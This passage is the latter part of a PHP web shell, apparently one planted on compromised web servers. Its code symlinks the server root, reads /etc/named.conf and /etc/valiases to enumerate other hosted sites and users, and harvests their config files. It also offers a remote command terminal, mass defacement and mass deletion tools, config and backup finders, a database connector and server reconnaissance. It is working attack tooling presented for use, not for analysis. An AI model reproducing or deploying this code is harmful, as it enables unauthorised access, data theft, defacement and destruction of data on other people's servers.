                                    }
                                }
                            }
                        }
                        fclose($etc);
                        echo '<div class="info-box success"><a href="?path=' . urlencode("$path/{$nick}_CONFIG") . '">Config files collected! Click here to view</a></div>';
                    }
                } elseif ($action == 'symlink') {
                    echo '<div class="info-box">';
                    @mkdir('sym', 0777);
                    $htaccess = "Options all \n DirectoryIndex sym.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
                    $write = @fopen('sym/.htaccess', 'w');
                    @fwrite($write, $htaccess);
                    @symlink('/', 'sym/root');

                    $read_named_conf = @file('/etc/named.conf');
                    if (!$read_named_conf) {
                        echo "<span class='error'>Cannot access /etc/named.conf</span>";
                    } else {
                        echo '<table>
                            <tr>
                                <th>Domain</th>
                                <th>User</th>
                                <th>Symlink</th>
                            </tr>';

                        foreach ($read_named_conf as $subject) {
                            if (stristr($subject, 'zone')) {
                                preg_match_all('#zone "(.*)"#', $subject, $string);
                                flush();

                                if (strlen(trim($string[1][0])) > 2) {
                                    $UID = @posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
                                    $name = $string[1][0];
                                    @symlink('/', 'sym/root');

                                    // Filter certain domains
                                    $filtered = false;
                                    $tlds = array('\\.ir', '\\.il', '\\.id', '\\.sg', '\\.edu', '\\.gov', '\\.go', '\\.gob', '\\.mil', '\\.mi');
                                    foreach ($tlds as $tld) {
                                        if (preg_match("/$tld/", $string[1][0])) {
                                            $filtered = true;
                                            break;
                                        }
                                    }

                                    if ($filtered) {
                                        $name = "<span class='warning'>" . htmlspecialchars($string[1][0]) . '</span>';
                                    }

                                    echo "<tr>
                                        <td><a href='http://www." . htmlspecialchars($string[1][0]) . "' target='_blank'>$name</a></td>
                                        <td>" . htmlspecialchars($UID['name']) . "</td>
                                        <td><a href='sym/root/home/" . htmlspecialchars($UID['name']) . "/public_html' target='_blank'>Symlink</a></td>
                                    </tr>";
                                    flush();
                                }
                            }
                        }
                        echo '</table>';
                    }
                    echo '</div>';
                }
            } else { ?>
                <div class="card table-responsive">
                    <table class="table table-dark table-hover table-sm align-middle">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th class="text-end">Size</th>
                                <th class="text-center">Permissions</th>
                                <th>Owner/Group</th>
                                <th>Modified</th>
                                <th class="text-center">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (realpath($path) !== realpath($_SERVER['DOCUMENT_ROOT']) && $path !== '/'): ?>
                                <tr>
                                    <td><i class="fas fa-level-up-alt text-warning me-2"></i><a href="?path=<?php echo urlencode(dirname($path)); ?>">[..]</a></td>
                                    <td colspan="5"></td>
                                </tr>
                            <?php endif;
                            $items = @scandir($path);
                            if ($items !== false) {
                                $dirs = [];
                                $files = [];
                                foreach (array_diff($items, ['.', '..']) as $item) {
                                    if (is_dir("$path/$item")) $dirs[] = $item;
                                    else $files[] = $item;
                                }
                                natcasesort($dirs);
                                natcasesort($files);
                                foreach (array_merge($dirs, $files) as $item) {
                                    $fullPath = "$path/$item";
                                    $isDir = is_dir($fullPath);
                                    $icon = $isDir ? 'fa-folder text-warning' : 'fa-file-alt text-light';
                                    echo '<tr>
                                <td class="word-break"><i class="fas ' . $icon . ' me-2"></i><a href="?' . ($isDir ? 'path=' . urlencode($fullPath) : 'filesrc=' . urlencode($fullPath)) . '" ' . (!$isDir ? 'target="_blank"' : '') . '>' . htmlspecialchars($item) . '</a></td>
                                <td class="text-end">' . ($isDir ? '-' : getFileSize(@filesize($fullPath))) . '</td>
                                <td class="text-center"><small>' . getFilePermissions($fullPath) . '</small></td>
                                <td><small>' . getFileOwner($fullPath) . '/' . getFileGroup($fullPath) . '</small></td>
                                <td><small>' . date('Y-m-d H:i', @filemtime($fullPath)) . '</small></td>
                                <td class="text-center">
                                    <div class="btn-group btn-group-sm">';
                                    if (!$isDir) {
                                        echo '<button class="btn-action text-primary" data-bs-toggle="modal" data-bs-target="#viewFileModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-eye"></i></button>';
                                        echo '<button class="btn-action text-info" data-bs-toggle="modal" data-bs-target="#editFileModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-edit"></i></button>';
                                    }
                                    echo '<button class="btn-action text-warning" data-bs-toggle="modal" data-bs-target="#renameModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-i-cursor"></i></button>
                                  <button class="btn-action text-secondary" data-bs-toggle="modal" data-bs-target="#permsModal" data-path="' . htmlspecialchars($fullPath) . '" data-perms="' . substr(sprintf('%o', fileperms($fullPath)), -4) . '"><i class="fas fa-lock"></i></button>
                                  <button class="btn-action text-danger" data-bs-toggle="modal" data-bs-target="#deleteModal" data-path="' . htmlspecialchars($fullPath) . '" data-type="' . ($isDir ? 'dir' : 'file') . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-trash"></i></button>
                                  </div></td></tr>';
                                }
                            } else {
                                echo '<tr><td colspan="6" class="text-center text-danger">Cannot read directory.</td></tr>';
                            } ?>
                        </tbody>
                    </table>
                </div>
            <?php } ?>
        </main>
        <footer class="text-center text-muted small mt-4">© <?php echo date('Y'); ?> <?php echo htmlspecialchars($nick); ?></footer>
    </div>

    <!-- MODALS -->
    <!-- View File -->
    <div class="modal fade" id="viewFileModal" tabindex="-1">
        <div class="modal-dialog modal-xl modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-eye me-2"></i>View File: <span id="viewFileName"></span></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <pre id="viewFileContent" class="p-3 rounded view-content"></pre>
                </div>
            </div>
        </div>
    </div>

    <!-- Upload -->
    <div class="modal fade" id="uploadModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-upload me-2"></i>Upload File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post" enctype="multipart/form-data">
                    <div class="modal-body"><input class="form-control" type="file" name="file" required></div>
                    <div class="modal-footer"><input type="hidden" name="action" value="upload"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-primary">Upload</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- New File -->
    <div class="modal fade" id="newFileModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-file-plus me-2"></i>New File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <div class="mb-3"><label class="form-label">File Name</label><input type="text" name="fileName" class="form-control" required></div>
                        <div><label class="form-label">Content</label><textarea name="content" rows="8" class="form-control code-editor"></textarea></div>
                    </div>
                    <div class="modal-footer"><input type="hidden" name="action" value="createFile"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-success">Create</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- New Folder -->
    <div class="modal fade" id="newFolderModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-folder-plus me-2"></i>New Folder</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body"><label class="form-label">Folder Name</label><input type="text" name="folderName" class="form-control" required></div>
                    <div class="modal-footer"><input type="hidden" name="action" value="createFolder"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-info">Create</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Edit File -->
    <div class="modal fade" id="editFileModal" tabindex="-1">
        <div class="modal-dialog modal-xl modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-edit me-2"></i>Edit File: <span id="editFileName"></span></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body"><input type="hidden" id="editFilePath" name="filePath"><textarea id="fileEditor" name="content" rows="15" class="form-control code-editor"></textarea></div>
                    <div class="modal-footer"><input type="hidden" name="action" value="saveFile"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-primary">Save Changes</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Rename -->
    <div class="modal fade" id="renameModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-i-cursor me-2"></i>Rename</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body"><input type="hidden" id="renamePath" name="path"><label class="form-label">New Name</label><input type="text" id="newName" name="newName" class="form-control" required></div>
                    <div class="modal-footer"><input type="hidden" name="action" value="rename"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-warning">Rename</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Permissions -->
    <div class="modal fade" id="permsModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-lock me-2"></i>Change Permissions</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body"><input type="hidden" id="permsPath" name="path"><label class="form-label">Permissions (Octal)</label><input type="text" id="perms" name="permissions" class="form-control" required></div>
                    <div class="modal-footer"><input type="hidden" name="action" value="changePermissions"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-primary">Change</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Delete -->
    <div class="modal fade" id="deleteModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title text-danger"><i class="fas fa-exclamation-triangle me-2"></i>Confirm Deletion</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body"><input type="hidden" id="deletePath" name="path"><input type="hidden" id="deleteType" name="type">
                        <p>Are you sure you want to delete <strong id="deleteItemName"></strong>?</p>
                        <p class="text-danger small">This action cannot be undone.</p>
                    </div>
                    <div class="modal-footer"><input type="hidden" name="action" value="delete"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-danger">Delete</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Terminal -->
    <div class="modal fade" id="commandModal" tabindex="-1">
        <div class="modal-dialog modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-terminal me-2"></i>Terminal</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div id="terminal-output" class="terminal p-2 mb-2"></div>
                    <form id="commandForm">
                        <div class="input-group"><span class="input-group-text terminal-prompt"></span><input type="text" name="command" class="form-control" autocomplete="off" autofocus><button type="submit" class="btn btn-primary">Run</button></div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Mass Tools Modal -->
    <div class="modal fade" id="massToolsModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-tools"></i> Mass Tools</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <ul class="nav nav-tabs" id="massToolsTabs" role="tablist">
                        <li class="nav-item" role="presentation">
                            <button class="nav-link active" id="mass-deface-tab" data-bs-toggle="tab" data-bs-target="#mass-deface" type="button" role="tab">Mass Deface</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="mass-delete-tab" data-bs-toggle="tab" data-bs-target="#mass-delete" type="button" role="tab">Mass Delete</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="find-configs-tab" data-bs-toggle="tab" data-bs-target="#find-configs" type="button" role="tab">Find Configs</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="find-backups-tab" data-bs-toggle="tab" data-bs-target="#find-backups" type="button" role="tab">Find Backups</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="database-tab" data-bs-toggle="tab" data-bs-target="#database" type="button" role="tab">Database</button>
                        </li>
                    </ul>
                    <div class="tab-content p-3 border border-top-0" id="massToolsContent">
                        <div class="tab-pane fade show active" id="mass-deface" role="tabpanel">
                            <form method="post">
                                <input type="hidden" name="action" value="massDeface">
                                <div class="mb-3">
                                    <label class="form-label">Target Directory</label>
                                    <input type="text" class="form-control" name="targetDir" value="<?php echo htmlspecialchars($path); ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">File Name</label>
                                    <input type="text" class="form-control" name="fileName" value="index.html">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Content</label>
                                    <textarea class="form-control code-editor" name="content" rows="10" placeholder="Paste your deface code here"></textarea>
                                </div>
                                <div class="mb-3">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="recursive" id="recursiveDeface" checked>
                                        <label class="form-check-label" for="recursiveDeface">Recursive (all subdirectories)</label>
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-danger">Execute Mass Deface</button>
                            </form>
                        </div>
                        <div class="tab-pane fade" id="mass-delete" role="tabpanel">
                            <form method="post">
                                <input type="hidden" name="action" value="massDelete">
                                <div class="mb-3">
                                    <label class="form-label">Target Directory</label>
                                    <input type="text" class="form-control" name="targetDir" value="<?php echo htmlspecialchars($path); ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">File Name Pattern</label>
                                    <input type="text" class="form-control" name="fileName" value="*.php.bak">
                                </div>
                                <div class="mb-3">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="recursive" id="recursiveDelete" checked>
                                        <label class="form-check-label" for="recursiveDelete">Recursive (all subdirectories)</label>
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-danger">Execute Mass Delete</button>
                            </form>
                        </div>
                        <div class="tab-pane fade" id="find-configs" role="tabpanel">
                            <form id="findConfigsForm">
                                <input type="hidden" name="action" value="findConfigs">
                                <div class="mb-3">
                                    <label class="form-label">Search Directory</label>
                                    <input type="text" class="form-control" name="searchDir" value="<?php echo htmlspecialchars($path); ?>">
                                </div>
                                <button type="submit" class="btn btn-primary">Find Configuration Files</button>
                            </form>
                            <pre id="findConfigsResult" class="mt-3 p-2 terminal" style="display:none; height: 250px;"></pre>
                        </div>
                        <div class="tab-pane fade" id="find-backups" role="tabpanel">
                            <form id="findBackupsForm">
                                <input type="hidden" name="action" value="findBackups">
                                <div class="mb-3">
                                    <label class="form-label">Search Directory</label>
                                    <input type="text" class="form-control" name="searchDir" value="<?php echo htmlspecialchars($path); ?>">
                                </div>
                                <button type="submit" class="btn btn-primary">Find Backup Files</button>
                            </form>
                            <pre id="findBackupsResult" class="mt-3 p-2 terminal" style="display:none; height: 250px;"></pre>
                        </div>
                        <div class="tab-pane fade" id="database" role="tabpanel">
                            <form id="dbConnectForm">
                                <input type="hidden" name="action" value="connectDb">
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label class="form-label">DB Host</label>
                                        <input type="text" class="form-control" name="db_host" value="localhost">
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label class="form-label">DB Name</label>
                                        <input type="text" class="form-control" name="db_name" placeholder="e.g., wordpress_db">
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label class="form-label">DB User</label>
                                        <input type="text" class="form-control" name="db_user" placeholder="e.g., root">
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label class="form-label">DB Password</label>
                                        <input type="password" class="form-control" name="db_pass">
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-success">Connect & List Tables</button>
                            </form>
                            <pre id="dbConnectResult" class="mt-3 p-2 terminal" style="display:none; height: 250px;"></pre>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Symlink Modal -->
    <div class="modal fade" id="symlinkModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-link me-2"></i>Create Symlink</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <div class="mb-3"><label class="form-label">Target Path</label><input type="text" name="target" class="form-control" placeholder="e.g., /var/www/html/target_folder" required></div>
                        <div class="mb-3"><label class="form-label">Symlink Name</label><input type="text" name="linkName" class="form-control" placeholder="e.g., my_symlink" required></div>
                    </div>
                    <div class="modal-footer"><input type="hidden" name="action" value="createSymlink"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-primary">Create Symlink</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Server Info Modal -->
    <!-- Server Info Modal -->
    <div class="modal fade" id="serverInfoModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-info-circle"></i> Server Information</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-6">
                            <h5>System Information</h5>
                            <ul class="list-unstyled">
                                <li><strong>PHP Version:</strong> <?php echo phpversion(); ?></li>
                                <li><strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                                <li><strong>Server Name:</strong> <?php echo $_SERVER['SERVER_NAME']; ?></li>
                                <li><strong>Server Protocol:</strong> <?php echo $_SERVER['SERVER_PROTOCOL']; ?></li>
                                <li><strong>Server Admin:</strong> <?php echo $_SERVER['SERVER_ADMIN'] ?? 'N/A'; ?></li>
                                <li><strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?></li>
                            </ul>

                            <h5 class="mt-4">PHP Configuration</h5>
                            <ul class="list-unstyled">
                                <li><strong>Safe Mode:</strong> <?php echo ini_get('safe_mode') ? 'On' : 'Off'; ?></li>
                                <li><strong>Disabled Functions:</strong> <?php echo ini_get('disable_functions') ?: 'None'; ?></li>
                                <li><strong>Open Basedir:</strong> <?php echo ini_get('open_basedir') ?: 'None'; ?></li>
                                <li><strong>Memory Limit:</strong> <?php echo ini_get('memory_limit'); ?></li>
                                <li><strong>Max Execution Time:</strong> <?php echo ini_get('max_execution_time'); ?>s</li>
                                <li><strong>Upload Max Filesize:</strong> <?php echo ini_get('upload_max_filesize'); ?></li>
                            </ul>
                        </div>
                        <div class="col-md-6">
                            <h5>PHP Extensions</h5>
                            <div class="d-flex flex-wrap">
                                <?php
                                $extensions = get_loaded_extensions();
                                natcasesort($extensions);
                                foreach ($extensions as $ext) {
                                    echo '<span class="badge bg-secondary me-1 mb-1">' . $ext . '</span>';
                                }
                                ?>
                            </div>

                            <h5 class="mt-4">Database Information</h5>
                            <ul class="list-unstyled">
                                <li><strong>MySQL Support:</strong> <?php echo extension_loaded('mysqli') ? 'Yes' : 'No'; ?></li>
                                <li><strong>PostgreSQL Support:</strong> <?php echo extension_loaded('pgsql') ? 'Yes' : 'No'; ?></li>
                                <li><strong>SQLite Support:</strong> <?php echo extension_loaded('sqlite3') ? 'Yes' : 'No'; ?></li>
                            </ul>

                            <h5 class="mt-4">Other Information</h5>
                            <ul class="list-unstyled">
                                <li><strong>Current User:</strong> <?php echo get_current_user(); ?></li>
                                <li><strong>User ID:</strong> <?php echo getmyuid(); ?></li>
                                <li><strong>Group ID:</strong> <?php echo getmygid(); ?></li>
                                <li><strong>Process ID:</strong> <?php echo getmypid(); ?></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // --- Penanganan Notifikasi Toast ---
            const toastEl = document.getElementById('notificationToast');
            const toast = new bootstrap.Toast(toastEl);

            function showToast(message, type = 'success') {
                const toastBody = toastEl.querySelector('#toast-body');
                const toastTitle = toastEl.querySelector('#toast-title');
                const toastIcon = toastEl.querySelector('#toast-icon');

                toastBody.textContent = message;
                toastEl.classList.remove('text-bg-success', 'text-bg-danger');
                if (type === 'success') {
                    toastEl.classList.add('text-bg-success');
                    toastTitle.textContent = 'Success';
                    toastIcon.className = 'fas fa-check-circle me-2';
                } else {
                    toastEl.classList.add('text-bg-danger');
                    toastTitle.textContent = 'Error';
                    toastIcon.className = 'fas fa-times-circle me-2';
                }
                toast.show();
            }

            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('message')) {
                const message = urlParams.get('message');
                const type = urlParams.has('success') ? 'success' : 'error';
                showToast(message, type);
                const cleanUrl = window.location.pathname + '?path=' + (urlParams.get('path') || '');
                window.history.replaceState({}, document.title, cleanUrl);
            }

            // --- Penanganan Data Dinamis pada Modal ---
            function handleModalEvents(modalId, callback) {
                const modalEl = document.getElementById(modalId);
                if (modalEl) {
                    modalEl.addEventListener('show.bs.modal', callback);
                    modalEl.addEventListener('show.bs.modal', function() {
                        this.style.setProperty('display', 'block', 'important');
                        this.style.setProperty('opacity', '1', 'important');
                    });
                }
            }

            handleModalEvents('viewFileModal', (event) => {
                const button = event.relatedTarget;
                const path = button.getAttribute('data-path');
                const name = button.getAttribute('data-name');
                const modal = event.currentTarget;
                modal.querySelector('#viewFileName').textContent = name;
                const contentArea = modal.querySelector('#viewFileContent');
                contentArea.textContent = 'Loading file content...';

                fetch('?filesrc=' + encodeURIComponent(path))
                    .then(response => {
                        if (!response.ok) throw new Error('File not found or not readable.');
                        return response.text();
                    })
                    .then(data => {
                        contentArea.textContent = data;
                    })
                    .catch(err => {
                        contentArea.textContent = 'Error: ' + err.message;
                        showToast('Failed to fetch file content.', 'error');
                    });
            });

            // Define the function to open edit file modal, so it can be reused
            function openEditFileModal(path, name) {
                const modal = document.getElementById('editFileModal');
                if (!modal) return; // Safety check

                modal.querySelector('#editFileName').textContent = name;
                modal.querySelector('#editFilePath').value = path;
                const editor = modal.querySelector('#fileEditor');
                editor.value = 'Loading file content...';

                fetch('?filesrc=' + encodeURIComponent(path))
                    .then(response => {
                        if (!response.ok) throw new Error('File not found or not readable.');
                        return response.text();
                    })
                    .then(data => {
                        editor.value = data;
                    })
                    .catch(err => {
                        editor.value = 'Error: ' + err.message + '. You can create this file by saving.';
                        showToast('Failed to fetch file content. You can create it by saving.', 'error');
                    });

                // Show the modal using Bootstrap's JS API
                const bsModal = new bootstrap.Modal(modal);
                bsModal.show();
            }

            // Update the original event listener to call this function
            handleModalEvents('editFileModal', (event) => {
                const button = event.relatedTarget;
                const path = button.getAttribute('data-path');
                const name = button.getAttribute('data-name');
                openEditFileModal(path, name);
            });

            handleModalEvents('renameModal', (event) => {
                const button = event.relatedTarget;
                const modal = event.currentTarget;
                modal.querySelector('#renamePath').value = button.getAttribute('data-path');
                modal.querySelector('#newName').value = button.getAttribute('data-name');
            });

            handleModalEvents('permsModal', (event) => {
                const button = event.relatedTarget;
                const modal = event.currentTarget;
                modal.querySelector('#permsPath').value = button.getAttribute('data-path');
                modal.querySelector('#perms').value = button.getAttribute('data-perms');
            });

            handleModalEvents('deleteModal', (event) => {
                const button = event.relatedTarget;
                const modal = event.currentTarget;
                modal.querySelector('#deletePath').value = button.getAttribute('data-path');
                modal.querySelector('#deleteType').value = button.getAttribute('data-type');
                modal.querySelector('#deleteItemName').textContent = button.getAttribute('data-name');
            });

            handleModalEvents('symlinkModal', (event) => {
                const modal = event.currentTarget;
                modal.querySelector('input[name="target"]').value = '';
                modal.querySelector('input[name="linkName"]').value = '';
            });

            // --- Terminal Interaktif ---
            const commandForm = document.getElementById('commandForm');
            let terminalCwd = '<?php echo htmlspecialchars($path); ?>'; // Set initial CWD

            function updateTerminalPrompt() {
                const maxPathLength = 20; // Max length for the displayed path
                let displayPath = terminalCwd;
                if (displayPath.length > maxPathLength) {
                    displayPath = '.../' + displayPath.split('/').slice(-2).join('/');
                }
                const prompt = `<?php echo htmlspecialchars(get_current_user()); ?>@<span class="text-warning">${displayPath}</span>:~$ `;
                document.querySelector('.terminal-prompt').innerHTML = prompt;
            }

            if (commandForm) {
                updateTerminalPrompt(); // Initial prompt setup

                commandForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    const commandInput = this.querySelector('input[name="command"]');
                    const command = commandInput.value.trim();
                    if (command === '') return;

                    const terminalOutput = document.getElementById('terminal-output');
                    const promptText = document.querySelector('.terminal-prompt').innerHTML;

                    terminalOutput.innerHTML += `<div><span class="text-secondary">${promptText}</span> ${command.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`;
                    commandInput.value = '';

                    // --- LOGIKA BARU UNTUK PERINTAH 'clear' ---
                    if (command === 'clear') {
                        terminalOutput.innerHTML = ''; // Kosongkan seluruh isi terminal
                        // Tambahkan kembali prompt dan perintah 'clear' yang baru saja diketik
                        terminalOutput.innerHTML += `<div><span class="text-secondary">${promptText}</span> ${command.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`;
                        terminalOutput.scrollTop = terminalOutput.scrollHeight; // Gulir ke bawah
                        return; // Hentikan pemrosesan lebih lanjut, jangan kirim ke server
                    }
                    // --- AKHIR LOGIKA BARU ---

                    // --- LOGIKA BARU UNTUK PERINTAH 'nano' dan 'vi' ---
                    const editCommandMatch = command.match(/^(nano|vi)\s+([^\s]+)$/);
                    if (editCommandMatch) {
                        const editorCommand = editCommandMatch[1];
                        const fileName = editCommandMatch[2];
                        const filePath = terminalCwd + '/' + fileName;
                        openEditFileModal(filePath, fileName);
                        terminalOutput.scrollTop = terminalOutput.scrollHeight;
                        return; // Hentikan pemrosesan lebih lanjut, jangan kirim ke server
                    }
                    // --- AKHIR LOGIKA BARU UNTUK PERINTAH 'nano' dan 'vi' ---

                    const formData = new FormData();
                    formData.append('action', 'executeCommand');
                    formData.append('command', command);
                    formData.append('cwd', terminalCwd); // Send current terminal CWD

                    fetch(window.location.href, {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                const output = data.output.replace(/</g, "&lt;").replace(/>/g, "&gt;");
                                terminalOutput.innerHTML += `<div>${output.replace(/\n/g, '<br>')}</div>`;
                                terminalCwd = data.new_path; // Update CWD from server response
                                updateTerminalPrompt(); // Update the prompt with the new path
                            } else {
                                terminalOutput.innerHTML += `<div class="text-danger">Error: ${data.output}</div>`;
                            }
                            terminalOutput.scrollTop = terminalOutput.scrollHeight;
                        }).catch(error => {
                            terminalOutput.innerHTML += `<div class="text-danger">Request failed: ${error}</div>`;
                            terminalOutput.scrollTop = terminalOutput.scrollHeight;
                        });
                });

                const commandModal = document.getElementById('commandModal');
                commandModal.addEventListener('shown.bs.modal', () => {
                    commandModal.querySelector('input[name="command"]').focus();
                });
            }

            // --- Mass Tools AJAX Forms ---
            function handleMassToolForms(formId, resultId) {
                const form = document.getElementById(formId);
                if (!form) return;

                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    const resultArea = document.getElementById(resultId);
                    const submitButton = form.querySelector('button[type="submit"]');
                    const originalButtonText = submitButton.innerHTML;

                    resultArea.style.display = 'block';
                    resultArea.textContent = 'Processing...';
                    submitButton.disabled = true;
                    submitButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...';

                    const formData = new FormData(form);

                    fetch(window.location.href, {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                resultArea.textContent = data.output || 'Completed successfully, but no output was returned.';
                            } else {
                                resultArea.textContent = 'Error: ' + (data.output || 'Unknown error.');
                            }
                        })
                        .catch(error => {
                            resultArea.textContent = 'Request failed: ' + error;
                        })
                        .finally(() => {
                            submitButton.disabled = false;
                            submitButton.innerHTML = originalButtonText;
                        });
                });
            }

            handleMassToolForms('findConfigsForm', 'findConfigsResult');
            handleMassToolForms('findBackupsForm', 'findBackupsResult');
            handleMassToolForms('dbConnectForm', 'dbConnectResult');

            handleModalEvents('serverInfoModal', (event) => {
                const contentArea = event.currentTarget.querySelector('#serverInfoContent');
                contentArea.innerHTML = '<div class="text-center"><span class="spinner-border"></span><p>Loading...</p></div>';
                fetch('?action=serverInfo')
                    .then(response => response.text())
                    .then(data => {
                        contentArea.innerHTML = data;
                    })
                    .catch(err => {
                        contentArea.innerHTML = '<p class="text-danger">Failed to load server info.</p>';
                    });
            });
        });
    </script>
</body>

</html>
